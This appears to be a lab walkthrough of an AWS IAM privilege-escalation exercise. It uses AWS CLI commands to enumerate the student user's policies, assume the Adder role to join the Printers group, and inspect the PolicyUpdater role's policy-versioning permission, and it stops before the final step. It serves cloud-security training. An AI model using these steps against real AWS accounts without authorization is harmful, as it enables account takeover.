### Dangerous Policy Combination II

First the profile has to be configured with the access keys provided by PT Academy

## Walkthrough

Get the attached user policies for `student` user which shows `IAMReadOnlyAccess` permission 

![image](https://user-images.githubusercontent.com/46797181/222863836-e087ae15-632c-4700-9537-0d8fa592fd96.png)

To get information about that attached policy, execute the below commands

```
aws iam list-user-policies --user-name student --profile PTAcademyJllerena
aws iam get-user-policy --user-name student --policy-name terraform-20230304005305909200000003 --profile PTAcademyJllerena

```
![image](https://user-images.githubusercontent.com/46797181/222868760-5cc5c2d0-0081-48c0-918f-34ce5cc9b98a.png)

Trying to create a user with `aws iam create-user --user-name jllerena --profile PTAcademyJllerena` will give a denied message direc

![image](https://user-images.githubusercontent.com/46797181/222869046-fa11aa80-93a7-4937-ac97-cbbfa03447f9.png)

Check Adder role policies and permissions. Also, check the role-policy document

```
aws iam list-role-policies --role-name Adder --profile PTAcademyJllerena
aws iam get-role-policy --role-name Adder --policy-name AddUser --profile PTAcademyJllerena 

```
![image](https://user-images.githubusercontent.com/46797181/222869512-0fd5c70d-5d77-4923-926a-397c12074313.png)

Role policy says that role Adder has permission to add any user to the Printers group. Next step is to assume Adder role with student user. `aws sts assume-role --role-arn arn:aws:iam::213923356313:role/Adder --role-session-name adder_jllerena --profile PTAcademyJllerena` 

![image](https://user-images.githubusercontent.com/46797181/222869789-58fb66f0-b288-4b69-a6e0-c3bb2eb9bbae.png)

Add student user to printers group and unset environment variable. 

```
aws iam add-user-to-group --group-name Printers --user-name student
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

```
List groups for the student user. `aws iam list-groups-for-user --user-name student --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222870473-52b827c6-77ba-4a26-b2bc-8bc21df7156b.png)

Check the policies attached to the PolicyUpdater role policies and check the role-policy document.
```
aws iam list-role-policies --role-name PolicyUpdater --profile PTAcademyJllerena
aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion --profile PTAcademyJllerena
```

![image](https://user-images.githubusercontent.com/46797181/222870852-ed359f25-7b31-462a-ac7b-12162fcffdd3.png)

Role policy says that role PolicyUpdater has permission to create a new PolicyVersion for `Print` policy. Check the policies attached to the group `Printers`. `aws iam list-attached-group-policies --group-name Printers --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222871232-0a83488b-db51-4482-b054-cd0ae52b7a3b.png)





